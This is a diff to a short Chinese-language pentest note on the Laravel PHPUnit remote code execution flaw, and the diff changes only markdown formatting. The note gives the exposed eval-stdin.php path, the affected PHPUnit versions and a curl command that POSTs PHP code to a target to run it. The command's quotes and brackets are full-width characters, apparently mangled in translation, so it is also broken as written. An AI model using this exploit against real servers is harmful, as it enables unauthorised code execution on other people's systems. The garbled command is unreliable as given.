@@ -1,9 +1,9 @@
-＃laravel框架中的常见错误
+### laravel框架中的常见错误
 1. Laravel PHPUnit远程代码执行
 * 完整路径利用：http://target.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
 * 受影响的版本：4.8.28之前的版本和5.6.3之前的5.x
 
-命令
+**命令**
 ```
 curl -d“ <？php echo php_uname（）;？>” http://target.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
 ```
